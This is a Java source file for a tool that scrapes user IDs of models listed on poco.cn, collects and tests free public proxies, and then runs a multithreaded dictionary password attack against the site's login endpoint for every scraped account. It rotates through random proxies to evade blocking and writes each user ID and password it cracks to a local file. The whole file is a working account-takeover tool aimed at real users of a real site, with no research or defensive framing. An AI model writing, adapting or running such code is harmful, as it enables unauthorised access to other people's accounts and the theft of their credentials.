package net.pickapack.spider.noJs.crawler.example;

import net.pickapack.dateTime.DateHelper;
import net.pickapack.net.NetworkHelper;
import net.pickapack.action.Function1;
import net.pickapack.io.file.IterableBigTextFile;
import net.pickapack.spider.noJs.crawler.NoJSCrawler;
import net.pickapack.spider.noJs.spider.HttpMethod;
import net.pickapack.spider.noJs.spider.NoJSSpider;
import net.pickapack.spider.noJs.spider.Page;
import org.apache.commons.io.FileUtils;
import org.apache.http.message.BasicNameValuePair;
import org.w3c.dom.Node;

import javax.xml.transform.TransformerException;
import javax.xml.xpath.XPathExpressionException;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class PocoNoJSCrawler extends NoJSCrawler {
    private List<String> userIds;
    private int numPages;
    private String nextUrl;
    private static int maxNumUsers = 2000;

    private static int numUsers = 0;

    public PocoNoJSCrawler() {
        this(null, -1);
    }

    public PocoNoJSCrawler(String proxyHost, int proxyPort) {
        super(NoJSSpider.FIREFOX_3_6, 60000, proxyHost, proxyPort);
        this.userIds = new ArrayList<String>();
    }

    @SuppressWarnings("unchecked")
    @Override
    protected void onPageVisited(Page page, Map<String, Object> context) {
        System.out.printf("[%s] Visiting page: %s\n", DateHelper.toString(new Date()), page.getUrl());

        String url = page.getUrl().toString();

        if (url.startsWith("http://model.poco.cn/model_level_list")) {
            List<Node> anchors = page.getByXPath("//li[@class='photo86']//p//a[starts-with(@href,'model_show.htx&model_user_id=')]//@href");
            for (Node anchor : anchors) {
                String href = anchor.getNodeValue();
                String prefix = "model_show.htx&model_user_id=";
                String userId = href.substring(href.indexOf(prefix) + prefix.length()).trim();
                if (userId != null && !userId.isEmpty() && !this.userIds.contains(userId)) {
                    this.userIds.add(userId);
                    System.out.printf("[# total users: %d] New user with id %s found%n", ++numUsers, userId);
                }
            }

            if (numUsers < maxNumUsers) {
                String xpath = "//div[@class='page clearfix']//a[@title='下一页']";
                Function1<Node, String> pred = new Function1<Node, String>() {
                    @Override
                    public String apply(Node param) {
                        return "http://model.poco.cn" + param.getAttributes().getNamedItem("href").getNodeValue();
                    }
                };

                if (++this.numPages < 10) {
                    this.visitLinks(page, xpath, null, pred);
                } else {
                    this.nextUrl = pred.apply(page.getFirstByXPath(xpath));
                }
            }
        }
    }

    public void grabUserIds(String url) {
        try {
            this.visit(new URL(url));
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean login(String url, String userId, String password) {
        try {
            System.out.printf("[%s] Logging in as: %s\n", DateHelper.toString(new Date()), userId);

            ArrayList<org.apache.http.NameValuePair> requestParameters = new ArrayList<org.apache.http.NameValuePair>();

            requestParameters.add(new BasicNameValuePair("locate", "http://www.poco.cn/"));
            requestParameters.add(new BasicNameValuePair("warm_tag", "1"));
            requestParameters.add(new BasicNameValuePair("CookieDate", "1"));
            requestParameters.add(new BasicNameValuePair("act", "login"));
            requestParameters.add(new BasicNameValuePair("user_name", userId));
            requestParameters.add(new BasicNameValuePair("login_type", "1"));
            requestParameters.add(new BasicNameValuePair("pass_word", password));
            requestParameters.add(new BasicNameValuePair("dont_remember_login_state", "1"));

            this.getPage(new URL(url), HttpMethod.POST, requestParameters, null, null);

            return this.getPage(new URL("http://www.poco.cn")).getFirstByXPath("//div[@id='login']//div[@class='signed']//span[@class='fr']//a[starts-with(@target,'/module_common/login/poco_login_act.php']") != null;
        } catch (IOException e) {
            recordException(e);
            return false;
        } catch (XPathExpressionException e) {
            throw new RuntimeException(e);
        } catch (TransformerException e) {
            throw new RuntimeException(e);
        }
    }

    public List<String> getUserIds() {
        return userIds;
    }

    public String getNextUrl() {
        return nextUrl;
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        ExecutorService executorServiceScanHosts = Executors.newFixedThreadPool(10);

//        HideMyPassHttpProxyListNoJSCrawler crawler = new HideMyPassHttpProxyListNoJSCrawler(NoJSSpider.FIREFOX_3_6, "10.26.27.29", 3128);
        HideMyPassHttpProxyListNoJSCrawler crawler = new HideMyPassHttpProxyListNoJSCrawler(NoJSSpider.FIREFOX_3_6);
        final List<HideMyPassHttpProxy> proxies = crawler.retrieveProxyList();
        crawler.close();
        for (final HideMyPassHttpProxy newProxy : proxies) {
            final String host = newProxy.getProxyHost();
            executorServiceScanHosts.submit(new Runnable() {
                @Override
                public void run() {
                    newProxy.setReachable(NetworkHelper.isHostReachable(host, 400));
                    newProxy.setPortReachable(NetworkHelper.isPortReachable(host, newProxy.getProxyPort(), 400));
                    System.out.printf("[new proxy found] reachable: %s, ip:%s, port %d: portReachable: %s\n", newProxy.isReachable(), newProxy.getProxyHost(), newProxy.getProxyPort(), newProxy.isPortReachable());
                }
            });
        }

        executorServiceScanHosts.shutdown();
        while (!executorServiceScanHosts.isTerminated()) {
            executorServiceScanHosts.awaitTermination(1000, TimeUnit.SECONDS);
        }

        for (Iterator<HideMyPassHttpProxy> iterator = proxies.iterator(); iterator.hasNext(); ) {
            HideMyPassHttpProxy proxy = iterator.next();
            if (!proxy.isPortReachable() || !proxy.getProtocol().equals("HTTP")) {
                iterator.remove();
            }
        }

        String fileNamePocoUsers = "/home/itecgo/pocoUsers_golden.txt";
        String fileNameCrackedPocoUsers = "/home/itecgo/crackedPocoUsers_golden.txt";

        final AtomicInteger numCrackedUsers = new AtomicInteger(0);

        final List<String> usersToCrack = new ArrayList<String>();

        List<String> userIds = new ArrayList<String>();

        if (new File(fileNamePocoUsers).exists()) {
            IterableBigTextFile file = new IterableBigTextFile(new FileReader(fileNamePocoUsers));
            for (String userId : file) {
                userId = userId.trim();
                if (!userIds.contains(userId)) {
                    userIds.add(userId);
                }
            }
        } else {
            String startUrl = "http://model.poco.cn/model_level_list.php?model_level=6&location_key=-1";

            PrintWriter pwUserIds = new PrintWriter(new FileWriter(fileNamePocoUsers));

            for (; ; ) {
                PocoNoJSCrawler crawlerGrabUserIds = new PocoNoJSCrawler();

                crawlerGrabUserIds.grabUserIds(startUrl);

                for (String userIdFound : crawlerGrabUserIds.getUserIds()) {
                    if (!userIds.contains(userIdFound)) {
                        userIds.add(userIdFound);
                        pwUserIds.println(userIdFound);
                    }
                }

                startUrl = crawlerGrabUserIds.getNextUrl();
                crawlerGrabUserIds.close();
                if (startUrl == null) {
                    break;
                }
            }

            pwUserIds.close();
        }

        for (final String userId : userIds) {
            usersToCrack.add(userId);
        }

        if (new File(fileNameCrackedPocoUsers).exists()) {
            IterableBigTextFile file = new IterableBigTextFile(new FileReader(fileNameCrackedPocoUsers));
            for (String line : file) {
                line = line.trim();
                String userId = line.substring(0, line.indexOf(","));
                if (usersToCrack.contains(userId)) {
                    usersToCrack.remove(userId);
                    numCrackedUsers.set(numCrackedUsers.get() + 1);
                }
            }
            file.close();
        }

        final AtomicInteger numCrackingsInCurrentPass = new AtomicInteger(0);

//        String pathToPasswords = "/home/itecgo/Tools/crackers/dictionaries/customized1";
        String pathToPasswords = "/home/itecgo/Tools/crackers/dictionaries/customized1/common_numbers_series.txt";
//        String pathToPasswords = "/home/itecgo/Tools/crackers/dictionaries/500-worst-passwords.txt";

        List<File> files = new ArrayList<File>();

        if (new File(pathToPasswords).isDirectory()) {
            files.addAll(FileUtils.listFiles(new File(pathToPasswords), new String[]{"txt"}, true));
        } else {
            files.add(new File(pathToPasswords));
        }

        final PrintWriter pwCrackedPocoUsers = new PrintWriter(new FileWriter(fileNameCrackedPocoUsers, true));

        for (File filePasswords1 : files) {
            IterableBigTextFile filePasswords = new IterableBigTextFile(new FileReader(filePasswords1));
            for (final String password : filePasswords) {
                ExecutorService executorService = Executors.newFixedThreadPool(50);
                numCrackingsInCurrentPass.set(0);

                Set<String> userIdsToCrack = new HashSet<String>();
                userIdsToCrack.addAll(usersToCrack);
                for (final String userId : userIdsToCrack) {
                    executorService.submit(new Runnable() {
                        @Override
                        public void run() {
                            synchronized (usersToCrack) {
                                System.out.printf("[# Cracked users: %d, numCrackingsInCurrentPass: %d, totalUsers: %d] cracking user id: %s%n", numCrackedUsers.get(), numCrackingsInCurrentPass.get(), usersToCrack.size(), userId);
                                usersToCrack.remove(userId);
                            }

                            HideMyPassHttpProxy proxy = proxies.get(random.nextInt(proxies.size() - 1));
                            if (proxy != null) {
//                                PocoNoJSCrawler crawlerLogin = new PocoNoJSCrawler();
                                PocoNoJSCrawler crawlerLogin = new PocoNoJSCrawler(proxy.getProxyHost(), proxy.getProxyPort());

                                System.out.printf("[%s] Logging %s with password: %s via proxy: %s:%d\n", DateHelper.toString(new Date()), userId, password, proxy.getProxyHost(), proxy.getProxyPort());

                                boolean isCracked = crawlerLogin.login("http://www1.poco.cn/module_common/login/poco_login_act.php", userId, password);

                                synchronized (usersToCrack) {
                                    if (isCracked) {
                                        pwCrackedPocoUsers.println(userId + "," + password);
                                        pwCrackedPocoUsers.flush();
                                        numCrackedUsers.set(numCrackedUsers.get() + 1);
                                    } else {
                                        usersToCrack.add(userId);
                                    }

                                    numCrackingsInCurrentPass.set(numCrackingsInCurrentPass.get() + 1);
                                }
                            } else {
                                System.out.println("No proxy available");
                            }
                        }
                    });
                }

                executorService.shutdown();

                while (!executorService.isTerminated()) {
                    executorService.awaitTermination(usersToCrack.size() * 10, TimeUnit.SECONDS);
                }
            }
            filePasswords.close();
        }
    }

    private static Random random = new Random();
}
